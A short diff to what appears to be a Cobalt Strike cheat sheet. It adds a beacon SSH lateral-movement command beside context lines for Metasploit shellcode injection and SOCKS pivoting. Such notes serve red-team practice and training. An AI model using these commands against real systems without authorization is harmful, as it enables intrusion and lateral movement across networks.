@@ -168,4 +168,6 @@ shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x6
 # Pivoting
 ## Open a socks proxy in the teamserver
 beacon> socks 1080
-</code></pre>
+
+# SSH connection
+beacon> ssh 10.10.17.12:22 username password</code></pre>
